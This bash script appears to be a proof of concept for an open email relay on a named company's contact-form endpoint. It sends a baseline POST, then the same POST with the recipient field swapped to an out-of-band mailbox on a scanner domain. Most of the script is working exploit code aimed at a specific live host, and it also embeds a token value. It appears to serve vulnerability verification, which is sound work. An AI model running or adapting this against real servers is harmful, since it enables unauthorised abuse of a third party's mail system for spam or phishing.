#!/bin/bash
# INDEPENDENT VERIFICATION: unauthenticated open email relay via POST /api/send
# Target: https://www.infinitycapital.bh/api/send
# Purpose: prove the server-side handler (not the browser) controls the recipient.
# All sends go ONLY to the scanner-provided OOB mailbox (@oast.abhedi.co.in) - no third parties.

TOKEN="cb416ccb076720508c0c63ed20f45ec97ec1d6ec12cd7ebd41cfd01e511f8f3e"
OOB="oast.abhedi.co.in"
SUBD="vrfy-$(date +%s)-$$"
TARGET="https://www.infinitycapital.bh/api/send"
STAMP="$(date -u +%Y%m%dT%H%M%SZ)"

echo "=============================================================="
echo " STEP 1 - BASELINE: exact copy of the site's legitimate form POST"
echo " Legit recipient used by the UI: targets=info@infinitycapital.bh"
echo "=============================================================="
curl -s -o /tmp/vr_base.json -w "HTTP:%{http_code}\n" -X POST "$TARGET" \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36' \
  -H 'Referer: https://www.infinitycapital.bh/contact' \
  -H 'Origin: https://www.infinitycapital.bh' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "fname=Verifier" \
  --data-urlencode "lname=Independent" \
  --data-urlencode "areacode=973" \
  --data-urlencode "tel=5550000" \
  --data-urlencode "cname=INF-CAP-SECVERIFY" \
  --data-urlencode "subject=Relay verification $STAMP" \
  --data-urlencode "msg=Independent verification of /api/send recipient handling. Marker=$SUBD" \
  --data-urlencode "check=on" \
  --data-urlencode "targets=info@infinitycapital.bh"

echo "Response body:"
cat /tmp/vr_base.json; echo
echo
echo "=============================================================="
echo " STEP 2 - ONLY DIFFERENCE: targets = MY OWN OOB mailbox"
echo " (no auth, no cookie jar, no session, fresh curl process)"
echo "=============================================================="
curl -s -o /tmp/vr_oob.json -w "HTTP:%{http_code}\n" -X POST "$TARGET" \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36' \
  -H 'Referer: https://www.infinitycapital.bh/contact' \
  -H 'Origin: https://www.infinitycapital.bh' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "fname=Verifier" \
  --data-urlencode "lname=Independent" \
  --data-urlencode "areacode=973" \
  --data-urlencode "tel=5550000" \
  --data-urlencode "cname=INF-CAP-SECVERIFY" \
  --data-urlencode "subject=Relay verification $STAMP" \
  --data-urlencode "msg=Independent verification of /api/send recipient handling. Marker=$SUBD" \
  --data-urlencode "check=on" \
  --data-urlencode "targets=vrfy-$SUBD@$OOB"

echo "Response body:"
cat /tmp/vr_oob.json; echo
echo
echo "Marker used this run: $SUBD"
